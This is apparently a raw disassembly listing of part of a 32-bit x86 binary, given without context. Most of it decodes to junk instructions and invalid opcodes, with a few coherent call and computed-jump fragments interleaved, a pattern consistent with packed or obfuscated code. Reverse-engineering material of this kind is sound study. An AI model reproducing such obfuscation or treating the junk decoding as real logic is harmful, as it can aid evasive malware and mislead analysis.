  40293d:	jge    0x402923
  40293f:	xchg   esi,eax
  402940:	xchg   BYTE PTR [ecx-0x68],ch
  402943:	pop    ecx
  402944:	and    BYTE PTR [ebp-0x20],dl
  402947:	pop    edx
  402948:	shl    ebx,0x65
  40294b:	jbe    0x40294a
  40294d:	in     al,dx
  40294e:	fimul  WORD PTR [esi]
  402950:	mov    dl,0x4a
  402952:	cmp    al,0x97
  402954:	cmp    al,0x59
  402956:	jo     0x4029b1
  402958:	cmc    
  402959:	push   0x4cfa2b5c
  40295e:	xor    eax,0xbbe27e4b
  402963:	push   esp
  402964:	jne    0x402920
  402966:	fs out 0xa,eax
  402969:	jle    0x402934
  40296b:	mov    al,ds:0x70b61f3d
  402970:	arpl   WORD PTR [edx-0x62],di
  402973:	nop
  402974:	leave  
  402975:	jne    0x402939
  402977:	or     DWORD PTR [esi+edi*8+0x25],ebp
  40297b:	imul   esp,edx
  40297e:	cmp    bl,cl
  402980:	ja     0x402959
  402982:	pop    edx
  402983:	cs inc edi
  402985:	push   edx
  402986:	int3   
  402987:	(bad)  
  402988:	mov    bl,0x90
  40298a:	popa   
  40298b:	fnstsw WORD PTR [esi]
  40298d:	push   ss
  40298e:	je     0x402a04
  402990:	xchg   DWORD PTR [edi],ebp
  402992:	bound  edi,QWORD PTR [eax+0x52]
  402995:	test   al,0x77
  402997:	inc    esi
  402998:	pop    ebx
  402999:	mov    dh,0xee
  40299b:	cli    
  40299c:	inc    ecx
  40299d:	jg     0x4029c6
  40299f:	int    0xa1
  4029a1:	push   ebx
  4029a2:	inc    edi
  4029a3:	std    
  4029a4:	pop    ebx
  4029a5:	and    bl,BYTE PTR [edi+0x7e]
  4029a8:	pusha  
  4029a9:	jp     0x4029f1
  4029ab:	mov    cl,0x65
  4029ad:	(bad)  
  4029ae:	sti    
  4029af:	in     al,dx
  4029b0:	loopne 0x40295e
  4029b2:	sub    ch,BYTE PTR [edx-0x7c]
  4029b5:	outs   dx,DWORD PTR ds:[esi]
  4029b6:	add    BYTE PTR [ebx-0x3a],ah
  4029b9:	mov    cl,0xd5
  4029bb:	mov    edx,0x95db3ead
  4029c0:	jg     0x4029f8
  4029c2:	popa   
  4029c3:	jecxz  0x402988
  4029c5:	or     dh,bl
  4029c7:	jmp    0x402a0f
  4029c9:	pushf  
  4029ca:	in     al,0x28
  4029cc:	pop    ecx
  4029cd:	ins    DWORD PTR es:[edi],dx
  4029ce:	pushf  
  4029cf:	cmc    
  4029d0:	mov    BYTE PTR [ecx-0x6f],0xf3
  4029d4:	push   esi
  4029d5:	clc    
  4029d6:	pop    es
  4029d7:	dec    ebx
  4029d8:	icebp  
  4029d9:	add    ch,BYTE PTR [ebp+eiz*1+0x16649f45]
  4029e0:	ret    0x6fc
  4029e3:	aaa    
  4029e4:	mov    eax,0x52ab1710
  4029e9:	and    bl,dl
  4029eb:	or     ah,BYTE PTR [eax]
  4029ed:	inc    ebp
  4029ee:	clc    
  4029ef:	add    BYTE PTR [eax-0x4bda620e],ah
  4029f5:	into   
  4029f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029f7:	lods   eax,DWORD PTR ds:[esi]
  4029f8:	push   ss
  4029f9:	enter  0x5cce,0xb0
  4029fd:	sbb    DWORD PTR ss:[eax],edi
  402a00:	cmc    
  402a01:	push   ebx
  402a02:	adc    DWORD PTR [ecx+eax*8],ebx
  402a05:	es dec eax
  402a07:	int    0xbf
  402a09:	lods   eax,DWORD PTR ds:[esi]
  402a0a:	(bad)
  402a0d:	jmp    0x8b7b:0x92ce940f
  402a14:	inc    ebp
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	xchg   edi,eax
  402a35:	inc    edx
  402a36:	and    ebx,DWORD PTR [ebx+0x7e7e0daa]
  402a3c:	cli    
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a2f
  402a41:	fwait
  402a42:	dec    edx
  402a43:	inc    ebp
  402a44:	pop    ss
  402a45:	add    al,0xd8
  402a47:	push   cs
  402a48:	dec    edx
  402a49:	jle    0x4029ec
  402a4b:	(bad)
  402a4e:	inc    ecx
  402a4f:	out    dx,al
  402a50:	and    al,cl
  402a52:	jo     0x402a80
  402a54:	mov    BYTE PTR [ebx],ch
  402a56:	jo     0x402a7c
  402a58:	sbb    ecx,ecx
  402a5a:	xchg   edx,eax
  402a5b:	test   BYTE PTR ds:0x85af5db9,dh
  402a61:	jmp    0x917b998a
  402a66:	mov    edi,0x516f918d
  402a6b:	push   cs
  402a6c:	sbb    DWORD PTR [edi+0x73],esp
  402a6f:	mov    ch,BYTE PTR [eax+0x55ef2dcd]
  402a75:	xor    ah,BYTE PTR [ecx+0x3a]
  402a78:	shr    DWORD PTR [edi],1
  402a7a:	cmp    BYTE PTR [eax+eax*4+0x1b186118],0x35
  402a82:	dec    eax
  402a83:	enter  0x1d3a,0x82
  402a87:	pop    esi
  402a88:	push   ds
  402a89:	call   0xec1b:0x5eccef5e
  402a90:	xor    ah,BYTE PTR ds:0x9d907e20
  402a96:	retf   
  402a97:	push   ds
  402a98:	arpl   bx,cx
  402a9a:	fistp  WORD PTR [ebx+0x5]
  402a9d:	push   ebx
  402a9e:	mov    cl,0x6b
  402aa0:	sbb    bl,BYTE PTR [esi]
  402aa2:	stc    
  402aa3:	sub    ebp,eax
  402aa5:	retf   
  402aa6:	push   edx
  402aa7:	dec    edi
  402aa8:	cmc    
  402aa9:	into   
  402aaa:	ins    DWORD PTR es:[edi],dx
  402aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402aac:	sbb    al,0x5a
  402aae:	(bad)  
  402ab1:	and    eax,0xb88d843d
  402ab6:	out    dx,eax
  402ab7:	in     eax,0x1e
  402ab9:	ins    BYTE PTR es:[edi],dx
  402aba:	jno    0x402a84
  402abc:	pop    esp
  402abd:	mul    bl
  402abf:	adc    dl,dl
  402ac1:	xor    eax,0x6e6084a
  402ac6:	jnp    0x402a5b
  402ac8:	mov    ?,WORD PTR [eax]
  402aca:	test   eax,0x875723b1
  402acf:	lods   al,BYTE PTR ds:[esi]
  402ad0:	test   al,0x1e
  402ad2:	mov    ah,BYTE PTR [ebx]
  402ad4:	add    edx,DWORD PTR [esi+ebx*8+0x4dea314b]
  402adb:	dec    eax
  402adc:	or     ebp,ebp
  402ade:	ficom  DWORD PTR [edi]
  402ae0:	(bad)  
  402ae1:	in     eax,0xd8
  402ae3:	adc    ebp,DWORD PTR [edx-0x1]
  402ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ae7:	add    DWORD PTR [ecx],esp
  402ae9:	push   edx
  402aea:	(bad)  
  402aeb:	mov    ebp,0xce08d242
  402af0:	push   eax
  402af1:	adc    esi,DWORD PTR [esi+eiz*2]
  402af4:	and    eax,0x4ba64d76
  402af9:	jmp    0x46ba:0x63f2503e
  402b00:	jno    0x402ab5
  402b02:	repz adc cl,BYTE PTR [edx+ecx*4]
  402b06:	call   0x71c5347d
  402b0b:	pushf  
  402b0c:	mov    dl,0x36
  402b0e:	or     edx,DWORD PTR [ebp-0x7f]
  402b11:	mov    esi,ecx
  402b13:	inc    edi
  402b14:	pop    ds
  402b15:	push   ss
  402b16:	or     eax,0xe4c34a57
  402b1b:	jnp    0x402b44
  402b1d:	pop    ecx
  402b1e:	sbb    eax,DWORD PTR [edi]
  402b20:	fisubr WORD PTR [eax+0xc]
  402b23:	popf   
  402b24:	mov    eax,0x2cd4da23
  402b29:	fisubr DWORD PTR [edx+edx*1+0x766fb038]
  402b30:	mov    edx,0x7d7770f4
  402b35:	data16 int 0x73
  402b38:	pop    edx
  402b39:	cmp    BYTE PTR [ecx-0x1d],cl
  402b3c:	add    ch,al
  402b3e:	sub    al,0x6d
  402b40:	add    DWORD PTR [esi+0x63],0xbfc20566
  402b47:	xor    bh,BYTE PTR [ebx+0x36]
  402b4a:	ja     0x402b24
  402b4c:	rep outs dx,DWORD PTR ds:[esi]
  402b4e:	ss (bad) 
  402b50:	push   eax
  402b51:	jmp    0xc82116d9
  402b56:	std    
  402b57:	(bad)  
  402b58:	ret    0x7c8e
  402b5b:	xor    ebp,esi
  402b5d:	lahf   
  402b5e:	jmp    0x402bd7
  402b60:	mov    esi,0xc4340fdd
  402b65:	pop    eax
  402b66:	mov    dh,0x8e
  402b68:	je     0x402b85
  402b6a:	mov    ss,WORD PTR [eiz*4+0x3c48cf13]
  402b71:	int3   
  402b72:	jp     0x402bc7
  402b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b75:	mov    eax,ds:0x375572d6
  402b7a:	fsub   QWORD PTR [esi+0x6b]
  402b7d:	cs loop 0x402b2c
  402b80:	pop    edi
  402b81:	(bad)  
  402b82:	and    BYTE PTR [eax+0x7b8f7168],ah
  402b88:	loop   0x402bd6
  402b8a:	cmp    al,dh
  402b8c:	sbb    DWORD PTR [edi],0xffffffde
  402b8f:	add    al,0x65
  402b91:	je     0x402b2b
  402b93:	retf   
  402b94:	daa    
  402b95:	cmp    bh,ch
  402b97:	push   ebx
  402b98:	mov    ds:0x92d26d03,eax
  402b9d:	inc    edi
  402b9e:	ret    0x158d
  402ba1:	xor    al,0x85
  402ba3:	sbb    DWORD PTR [eax],ebp
  402ba5:	scas   eax,DWORD PTR es:[edi]
  402ba6:	aas    
  402ba7:	push   es
  402ba8:	(bad)  
  402ba9:	pop    ds
  402baa:	sti    
  402bab:	sbb    BYTE PTR [edx+0xfca1dc4],ch
  402bb1:	or     eax,0xede610a2
  402bb6:	pushf  
  402bb7:	pusha  
  402bb8:	fs loop 0x402b72
  402bbb:	pop    ss
  402bbc:	or     BYTE PTR [ecx+0x2327abc0],bh
  402bc2:	inc    ebp
  402bc3:	xchg   ebx,eax
  402bc4:	test   eax,eax
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	sub    DWORD PTR [ecx],0xb36e1f1
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c99
  402c1e:	cli    
  402c1f:	lods   al,BYTE PTR ds:[esi]
  402c20:	retf   0x5361
  402c23:	das    
  402c24:	sbb    BYTE PTR [eax-0x1ffc4fe8],dh
  402c2a:	xchg   edx,eax
  402c2b:	or     al,0xe3
  402c2d:	adc    BYTE PTR [ebx+0x24],dl
  402c30:	sahf   
  402c31:	mov    dl,BYTE PTR [ebp+0x24]
  402c34:	mov    ebp,edi
  402c36:	imul   ebp,DWORD PTR [eax+edx*8+0x2f],0x3e
  402c3b:	outs   dx,BYTE PTR ds:[esi]
  402c3c:	pop    esp
  402c3d:	cmp    bl,BYTE PTR [ebp+0x3b]
  402c40:	push   esi
  402c41:	cmp    al,0xbe
  402c43:	loopne 0x402bd1
  402c45:	sub    eax,DWORD PTR [esi]
  402c47:	dec    ebp
  402c48:	sub    BYTE PTR [ebx],0xd0
  402c4b:	iret   
  402c4c:	loopne 0x402cae
  402c4e:	sbb    bh,dh
  402c50:	sub    WORD PTR es:[ecx-0x58],di
  402c55:	xchg   esp,eax
  402c56:	mov    dl,0xd8
  402c58:	test   DWORD PTR [edx],edx
  402c5a:	into   
  402c5b:	mov    edi,0xda854947
  402c60:	lods   al,BYTE PTR ds:[esi]
  402c61:	fcomp  QWORD PTR [edi]
  402c63:	rcl    BYTE PTR [edx+0x169c1b71],cl
  402c69:	push   0x10
  402c6b:	addr16 repz cmp bl,bl
  402c6f:	mov    cl,0x46
  402c71:	cmp    BYTE PTR [esp+ebp*2-0x10],dh
  402c75:	pop    esi
  402c76:	or     ah,BYTE PTR [edx-0x5614b422]
  402c7c:	test   BYTE PTR [edi],dh
  402c7e:	test   eax,0xca18cbaa
  402c83:	cwde   
  402c84:	adc    DWORD PTR [ecx],0xffffffc3
  402c87:	xchg   ecx,eax
  402c88:	sbb    cl,al
  402c8a:	pop    ss
  402c8b:	mov    edi,0xe26e956f
  402c90:	ins    BYTE PTR es:[edi],dx
  402c91:	pop    esp
  402c92:	mov    esp,0x986cb575
  402c97:	sub    al,0x76
  402c99:	and    eax,0x23492dc
  402c9e:	dec    edi
  402c9f:	and    BYTE PTR [esi+0x57],bl
  402ca2:	repz inc esp
  402ca4:	es dec edx
  402ca6:	xchg   esp,eax
  402ca7:	ror    BYTE PTR [edx],0xac
  402caa:	repz into 
  402cac:	fdivr  QWORD PTR cs:[eax+0x1a]
  402cb0:	adc    ebp,DWORD PTR [ebx-0x4a]
  402cb3:	push   edx
  402cb4:	adc    al,0x7f
  402cb6:	mov    ds:0x3f620aa5,al
  402cbb:	mov    ebp,0xb7844ed8
  402cc0:	in     al,dx
  402cc1:	inc    ebp
  402cc2:	add    BYTE PTR ds:0x4ec39e97,dh
  402cc8:	faddp  st(4),st
  402cca:	jae    0x402c86
  402ccc:	push   eax
  402ccd:	adc    al,0x25
  402ccf:	dec    ebx
  402cd0:	outs   dx,BYTE PTR ds:[esi]
  402cd1:	push   esp
  402cd2:	or     eax,0xc041ba48
  402cd7:	push   esp
  402cd8:	adc    BYTE PTR ds:0x8b5c9e06,al
  402cde:	mov    esi,0x13e06a83
  402ce3:	mov    eax,ds:0xb37a3338
  402ce8:	retf   0xfdb4
  402ceb:	loop   0x402d5e
  402ced:	mov    BYTE PTR [esi],al
  402cef:	stos   DWORD PTR es:[edi],eax
  402cf0:	inc    edx
  402cf1:	or     DWORD PTR [ecx],ebp
  402cf3:	sub    al,0x2b
  402cf5:	dec    ebp
  402cf6:	(bad)  
  402cf7:	ins    BYTE PTR es:[edi],dx
  402cf8:	hlt    
  402cf9:	dec    ecx
  402cfa:	xor    DWORD PTR [edx+ecx*2+0x2e],ebp
  402cfe:	sub    al,dl
  402d00:	fist   WORD PTR [esi-0x1f]
  402d03:	push   ss
  402d04:	jmp    0xfbc:0xaac0ca1f
  402d0b:	mov    BYTE PTR ds:0xa9a3e146,dl
  402d11:	dec    esp
  402d12:	jne    0x402cfd
  402d14:	add    ebp,DWORD PTR [edx+0x39]
  402d17:	and    eax,DWORD PTR [esi+0x15]
  402d1a:	cdq    
  402d1b:	outs   dx,BYTE PTR ds:[esi]
  402d1c:	popa   
  402d1d:	imul   BYTE PTR [edx]
  402d1f:	push   ebp
  402d20:	daa    
  402d21:	jle    0x402d84
  402d23:	jo     0x402d51
  402d25:	xchg   edi,eax
  402d26:	cmc    
  402d27:	out    0x23,eax
  402d29:	aaa    
  402d2a:	repz cmp al,0x5a
  402d2d:	arpl   WORD PTR [ebp+0x4f],dx
  402d30:	fadd   st(7),st
  402d32:	in     al,dx
  402d33:	retf   
  402d34:	jns    0x402cfc
  402d36:	mov    ecx,0xefd6477a
  402d3b:	xor    eax,edi
  402d3d:	push   esp
  402d3e:	mov    ebp,0x8388fbc2
  402d43:	and    eax,0xd7c1028
  402d48:	dec    edx
  402d49:	stos   DWORD PTR es:[edi],eax
  402d4a:	ret    0x4563
  402d4d:	cmp    al,0xcd
  402d4f:	pop    esi
  402d50:	cs aaa 
  402d52:	outs   dx,DWORD PTR ds:[esi]
  402d53:	jb     0x402d40
  402d55:	mov    ?,WORD PTR [edx+0x6267908a]
  402d5b:	pop    edx
  402d5c:	sub    BYTE PTR [ecx+ebx*4-0x184bfc53],cl
  402d63:	add    BYTE PTR [eax],ah
  402d65:	es out dx,eax
  402d67:	out    dx,eax
  402d68:	xor    al,0x63
  402d6a:	cmp    DWORD PTR [esi-0x1ca114d0],0x1f0397ee
  402d74:	sub    dh,BYTE PTR [esi+0x653fe120]
  402d7a:	inc    ecx
  402d7b:	xlat   BYTE PTR ds:[ebx]
  402d7c:	jnp    0x402dc7
  402d7e:	jl     0x402d5e
  402d80:	imul   esi,DWORD PTR [ebp-0x70d9b7a6],0x28
  402d87:	int3   
  402d88:	lea    ebp,es:[esi+eiz*1-0x3e]
  402d8d:	test   eax,0xc48a21b8
  402d92:	(bad)  
  402d93:	stc    
  402d94:	push   es
  402d95:	not    DWORD PTR [eax+0x41e49744]
  402d9b:	cmc    
  402d9c:	ins    BYTE PTR es:[edi],dx
  402d9d:	xor    BYTE PTR [ebx],bl
  402d9f:	popf   
  402da0:	sbb    ch,BYTE PTR [ebx]
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [edx+edi*4-0x2c],1
  402de7:	in     eax,dx
  402de8:	(bad)  
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402da8
  402df2:	mov    ch,0x58
  402df4:	or     eax,0x3aa3a3ec
  402df9:	mov    ch,0x53
  402dfb:	xor    dh,BYTE PTR [edx-0x2e]
  402dfe:	inc    ecx
  402dff:	addr16 pop es
  402e01:	push   cs
  402e02:	and    eax,0xdc9e79ea
  402e07:	mov    edi,0xd56157f5
  402e0c:	mov    esp,0xdc8df345
  402e11:	mov    ecx,0x7bd7f8b
  402e16:	rcr    DWORD PTR [ebx],1
  402e18:	jl     0x402e32
  402e1a:	jge    0x402e54
  402e1c:	icebp  
  402e1d:	scas   al,BYTE PTR es:[edi]
  402e1e:	push   ebx
  402e1f:	add    BYTE PTR [esi+edx*4+0x8],dh
  402e23:	(bad)  
  402e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e25:	sbb    eax,0x7a8ebcaa
  402e2a:	push   ds
  402e2b:	retf   
  402e2c:	sub    eax,0x5db2e1a8
  402e31:	fisttp WORD PTR [ecx+edx*1+0x7c]
  402e35:	adc    dh,BYTE PTR [ecx]
  402e37:	sub    BYTE PTR [ebx+0x6886091d],cl
  402e3d:	loopne 0x402eaa
  402e3f:	add    ebp,edi
  402e41:	pop    edi
  402e42:	jae    0x402df0
  402e44:	daa    
  402e45:	adc    DWORD PTR [edx+eax*8+0x24],edi
  402e49:	mov    esp,0x59b80160
  402e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e4f:	jmp    0x402e72
  402e51:	fmul   QWORD PTR [edi]
  402e53:	or     esi,esi
  402e55:	jno    0x402e4b
  402e57:	fsubr  st(4),st
  402e59:	xchg   edi,eax
  402e5a:	nop
  402e5b:	sub    BYTE PTR [edx],dl
  402e5d:	fiadd  DWORD PTR [edx]
  402e5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e61:	mov    ?,edi
  402e63:	jb     0x402e78
  402e65:	sbb    eax,0x8567a750
  402e6a:	xchg   ecx,eax
  402e6b:	fiadd  WORD PTR [ebx]
  402e6d:	sub    esi,DWORD PTR ds:[ebp-0x1bfbc643]
  402e74:	xchg   ecx,eax
  402e75:	cmp    al,0x4a
  402e77:	dec    eax
  402e78:	jmp    0x84f0dc38
  402e7d:	mov    eax,0xd75e7e21
  402e82:	inc    eax
  402e83:	fdiv   DWORD PTR [edx-0x18]
  402e86:	xor    DWORD PTR [ebx-0x62],ebp
  402e89:	adc    DWORD PTR [edi+0x4f3170b3],ebp
  402e8f:	cli    
  402e90:	out    dx,al
  402e91:	xchg   ebp,eax
  402e92:	mov    dl,0xa
  402e94:	(bad)  [ebp-0x18]
  402e97:	mov    dh,0xc9
  402e99:	addr16 xchg edx,eax
  402e9b:	in     eax,dx
  402e9c:	jp     0x402ee2
  402e9e:	imul   edx,DWORD PTR [ebx+0x44ad86ca],0x60
  402ea5:	or     DWORD PTR [esi+0x6a240f7d],ebp
  402eab:	fdivr  QWORD PTR [edx+0x3b]
  402eae:	leave  
  402eaf:	mov    dh,0xc7
  402eb1:	out    dx,al
  402eb2:	cmp    al,0x17
  402eb4:	mov    eax,ds:0xbbceede6
  402eb9:	bt     DWORD PTR ds:0x229cac7d,eax
  402ec0:	(bad)  
  402ec1:	push   ebx
  402ec2:	cmc    
  402ec3:	jg     0x402e5d
  402ec5:	leave  
  402ec6:	and    eax,0x36f344f1
  402ecb:	or     eax,DWORD PTR [edi-0x77]
  402ece:	mov    ecx,0x78adf1de
  402ed3:	pcmpgtb mm6,QWORD PTR gs:[esi-0x1e60344]
  402edb:	add    BYTE PTR [ecx],ah
  402edd:	ret    
  402ede:	addr16 jae 0x402f5f
  402ee1:	mov    ds:0xd82fe9c3,eax
  402ee6:	ret    
  402ee7:	imul   eax,DWORD PTR ds:0xe0363ea5,0xfffffff7
  402eee:	xchg   BYTE PTR [esp],bl
  402ef1:	mov    DWORD PTR [esi+0x5],eax
  402ef4:	cli    
  402ef5:	jbe    0x402ec0
  402ef7:	mov    eax,ds:0x64096b6b
  402efc:	dec    eax
  402efd:	outs   dx,DWORD PTR ds:[esi]
  402efe:	mov    ecx,0x1ce5e6db
  402f03:	xchg   BYTE PTR [eax],cl
  402f05:	rcr    BYTE PTR [ebx+0x58cd2f54],0xce
  402f0c:	(bad)  
  402f0e:	or     eax,0xc101d1b2
  402f13:	jb     0x402eb6
  402f15:	nop
  402f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f17:	fimul  DWORD PTR [ebx+0x668ae3d7]
  402f1d:	ret    0x1c7b
  402f20:	dec    edi
  402f21:	push   0x57
  402f23:	std    
  402f24:	mov    edx,0x845b4a85
  402f29:	and    DWORD PTR [esi-0x501c30e3],edi
  402f2f:	cdq    
  402f30:	ffree  st(2)
  402f32:	repz ret 
  402f34:	xlat   BYTE PTR ds:[ebx]
  402f35:	fdiv   st,st(2)
  402f37:	jno    0x402fb4
  402f39:	loopne 0x402f77
  402f3b:	hlt    
  402f3c:	loop   0x402f89
  402f3e:	and    dl,BYTE PTR [edi+0xc]
  402f41:	dec    edx
  402f42:	mov    al,ds:0x27a09ffc
  402f47:	jmp    0xbc18:0xa4d360f8
  402f4e:	or     DWORD PTR [edi-0x66],esi
  402f51:	jle    0x402f7d
  402f53:	ins    BYTE PTR es:[edi],dx
  402f54:	test   DWORD PTR [ebx-0xf6e32b],eax
  402f5a:	jne    0x402f2c
  402f5c:	shl    al,cl
  402f5e:	push   eax
  402f5f:	xchg   ebx,eax
  402f60:	shl    DWORD PTR [ecx+0x50],cl
  402f63:	or     al,0x5a
  402f65:	jmp    0x4760:0x110dda0e
  402f6c:	push   es
  402f6d:	cmp    bl,BYTE PTR [ebx-0x73]
  402f70:	jns    0x402f89
  402f72:	int    0x4f
  402f74:	and    al,0x8d
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x53d6a5b7]
  402fae:	mov    DWORD PTR [esi+edi*1+0x16],ebx
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f75
  402fb9:	imul   ecx,ebp,0xd92650d1
  402fbf:	aas    
  402fc0:	fadd   DWORD PTR [ecx]
  402fc2:	inc    ebp
  402fc3:	mul    esi
  402fc5:	outs   dx,DWORD PTR ds:[esi]
  402fc6:	xor    BYTE PTR [ebp+0x28],al
  402fc9:	cli    
  402fca:	push   ebx
  402fcb:	out    dx,eax
  402fcc:	sub    eax,0xe82a77ab
  402fd1:	mov    esp,0x4191397b
  402fd6:	dec    edi
  402fd7:	nop
  402fd8:	jo     0x402ff7
  402fda:	repnz pusha 
  402fdc:	setns  bl
  402fdf:	xor    edi,DWORD PTR [edx+0x70]
  402fe2:	mov    ?,WORD PTR [ecx]
  402fe4:	inc    esi
  402fe5:	inc    eax
  402fe6:	mov    bl,0xf
  402fe8:	pop    ss
  402fe9:	retf   0xe91a
  402fec:	mov    esi,0x515720b6
  402ff1:	jnp    0x402f75
  402ff3:	mov    cl,0xa2
  402ff5:	inc    eax
  402ff6:	stos   BYTE PTR es:[edi],al
  402ff7:	xchg   DWORD PTR [esi],edx
  402ff9:	sbb    edi,DWORD PTR [eax+ebp*8-0x46]
  402ffd:	sub    DWORD PTR [esi],0x18d315b1
  403003:	xchg   edx,eax
  403004:	pop    ecx
  403005:	cmc    
  403006:	(bad)  
  403008:	jp     0x402f9a
  40300a:	cmp    eax,0x97b998d1
  40300f:	mov    ch,0xa9
  403011:	aad    0x4d
  403013:	stc    
  403014:	rol    BYTE PTR [ebx-0x25fc178],1
  40301a:	shr    BYTE PTR [ebx],cl
  40301c:	imul   ecx,DWORD PTR [eax-0x13],0xbe745c3
  403023:	dec    ecx
  403024:	mov    ecx,0x3b276fab
  403029:	enter  0xb73f,0xbb
  40302d:	push   es
  40302e:	xor    BYTE PTR [edi],cl
  403030:	in     eax,dx
  403031:	pop    es
  403032:	xor    eax,ebx
  403034:	add    DWORD PTR [edi+ecx*1+0x51],esp
  403038:	mov    ds:0xecdf54e4,eax
  40303d:	cs bnd jge 0x40306d
  403041:	push   ebx
  403042:	inc    edx
  403043:	jns    0x403017
  403045:	push   ecx
  403046:	out    dx,eax
  403047:	adc    eax,0x11648469
  40304c:	xor    eax,DWORD PTR [ecx+0x696a0fbb]
  403052:	push   cs
  403053:	jae    0x403058
  403055:	bound  ebp,QWORD PTR [edx-0xf3e5e5a]
  40305b:	mov    edx,0x2bd1d6d9
  403060:	jl     0x403005
  403062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403063:	push   ds
  403064:	fsubr  st,st(4)
  403066:	lods   eax,DWORD PTR ds:[esi]
  403067:	cdq    
  403068:	mov    ebp,DWORD PTR [esi]
  40306a:	push   ss
  40306b:	popa   
  40306c:	sub    ah,BYTE PTR [ebx+0x74]
  40306f:	out    dx,eax
  403070:	(bad)  
  403071:	les    esp,FWORD PTR [eax-0x61ffccf3]
  403077:	xchg   ecx,eax
  403078:	cli    
  403079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40307a:	cld    
  40307b:	call   0x77b789df
  403080:	jbe    0x4030dc
  403082:	adc    DWORD PTR [eax],ebx
  403084:	mov    BYTE PTR [ecx-0x253e5091],dh
  40308a:	je     0x4030c7
  40308c:	jno    0x4030a4
  40308e:	ins    BYTE PTR es:[edi],dx
  40308f:	mov    ds:0xe29f5505,al
  403094:	dec    eax
  403095:	(bad)  
  403096:	push   ebx
  403097:	mov    bh,0xf9
  403099:	retf   
  40309a:	mov    eax,ds:0xf62e778c
  40309f:	pop    esi
  4030a0:	daa    
  4030a1:	retf   0x655b
  4030a4:	jne    0x403090
  4030a6:	add    DWORD PTR [ebx-0x11],ebx
  4030a9:	xchg   ebp,eax
  4030aa:	add    bh,dh
  4030ac:	test   BYTE PTR ds:[esi-0x5d],0xfb
  4030b1:	jne    0x4030af
  4030b3:	and    esi,DWORD PTR ds:0x78ef8cbe
  4030b9:	mov    al,0xc1
  4030bb:	or     al,0xe8
  4030bd:	adc    DWORD PTR [ebp+0x56],eax
  4030c0:	cmp    BYTE PTR [esi],0x1
  4030c3:	not    DWORD PTR [esp+eiz*4+0x60]
  4030c7:	hlt    
  4030c8:	push   ecx
  4030c9:	rcl    DWORD PTR [edi-0x19],0x18
  4030cd:	mov    ds:0x8d25b260,eax
